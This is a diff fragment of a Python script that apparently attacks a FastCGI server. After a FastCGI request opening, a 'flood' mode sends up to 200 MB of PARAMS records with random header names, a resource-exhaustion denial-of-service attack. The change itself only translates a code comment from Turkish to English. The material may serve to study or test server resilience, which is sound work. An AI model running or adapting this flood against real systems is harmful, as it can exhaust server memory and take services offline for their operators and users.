@@ -23,7 +23,7 @@ s.sendall(rec(1, 1, struct.pack("!HB5x", 1, 0)) + rec(4, 1, b"".join(nv(k, v) fo
 if mode == "flood":
     sent = 0
     try:
-        while sent < 200 * 1024 * 1024:   # 200 MB'a kadar yeni adlı PARAMS
+        while sent < 200 * 1024 * 1024:   # up to 200 MB of PARAMS with new names
             body = b"".join(nv(b"HTTP_X_" + os.urandom(8).hex().encode(), b"v" * 200) for _ in range(250))
             s.sendall(rec(4, 1, body)); sent += len(body)
     except OSError:
